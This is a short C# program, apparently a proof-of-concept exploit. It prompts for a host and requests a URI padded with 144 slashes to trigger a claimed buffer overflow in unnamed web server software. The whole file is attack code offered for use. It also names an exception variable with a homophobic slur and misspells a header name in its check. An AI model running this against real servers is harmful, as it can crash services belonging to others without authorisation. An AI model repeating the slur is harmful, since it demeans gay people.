/* BoF when requesting URI longer than 120~ */

using System;
using System.IO;
using System.Net;
using System.Text;

namespace idiot
{
    class pf
    {
        static void Main(string[] args)
        {
            Console.Write("Enter host:\n");
            string site = Console.ReadLine();
            string uri = null;
            try
            {
                for (int i = 0; i < 144; i++) { uri += "/"; }
                HttpWebRequest request = (HttpWebRequest)
                    HttpWebRequest.Create(site + uri);
                HttpWebResponse response = (HttpWebResponse)

                    request.GetResponse();

                //any response we get means that exploit failed
                if (response.GetResponseHeader("Content-Lenght") != "a")
                {
                    Console.WriteLine("Exploit failed");
                }

            }
            catch (Exception gayexception)
            {
                Console.WriteLine("Cannot connect");
                Console.WriteLine("{0}", gayexception.Message);
            }
        }
    }
}
